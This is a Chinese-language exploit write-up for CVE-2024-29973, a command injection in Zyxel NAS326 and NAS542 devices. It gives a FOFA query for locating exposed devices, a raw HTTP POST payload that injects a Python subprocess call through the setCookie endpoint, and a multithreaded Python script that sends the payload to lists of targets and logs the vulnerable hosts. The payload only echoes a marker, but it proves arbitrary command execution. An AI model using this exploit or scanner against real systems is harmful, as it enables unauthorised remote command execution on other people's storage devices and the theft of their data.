# CVE-2024-29973

## 漏洞名称

```
Zyxel NAS326和Zyxel NAS542 操作系统命令注入漏洞
```

## 漏洞影响

```
Zyxel NAS326 V5.21(AAZF.17)C0之前版本
NAS542 V5.21(ABAG.14)C0之前版本
```

## 漏洞描述

```
Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。
```

## 测绘语法

```
fofa：
app="ZYXEL-NAS326"
```

## 漏洞复现

发送数据包如下

```
POST /cmd,/simZysh/register_main/setCookie HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Connection: close
Content-Length: 255
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Accept-Encoding: gzip

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="c0"

storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo SGFjayBCeSBQcmF5", shell=True)#
------WebKitFormBoundarygcflwtei--
```

响应包如下，其中包含”SGFjayBCeSBQcmF5“则证明漏洞存在

```
HTTP/1.1 200 OK
Connection: close
Content-Length: 78
Content-Type: application/json
Date: Fri, 21 Jun 2024 03:51:48 GMT
Server: Apache

{"errno0": 0, "errmsg0": "OK", "zyshdata0": ["SGFjayBCeSBQcmF5\n"]}
```

### poc脚本

~~~markdown
# 导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止他报错
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 指纹模块
def banner():
    banner = """

██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   
                                                                                                                    
                                version:1.1.0                     
                                author:mazha.top
"""
    print(banner)

# poc模块
def poc(target):
    url = target+"/cmd,/simZysh/register_main/setCookie"
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Connection": "close",
            "Content-Length": "255",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei",
            "Accept-Encoding": "gzip"
    }


    data="""------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="c0"\r\n\r\nstorage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("echo SGFjayBCeSBQcmF5", shell=True)#\r\n------WebKitFormBoundarygcflwtei--"""
    try:
        res = requests.post(data=data,url=url,headers=headers,verify=False,timeout=10)
        if  res.status_code == 200 and "SGFjayBCeSBQcmF5" in res.text:
                    print(f"{GREEN}[+] [CVE-2024-29973] {target}\n{RESET}")
                    with open ('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else :
            print(f"[-] 不存在此漏洞!")
    except Exception as e:
        print("[*] 无法访问")

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a testing tool")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()
~~~

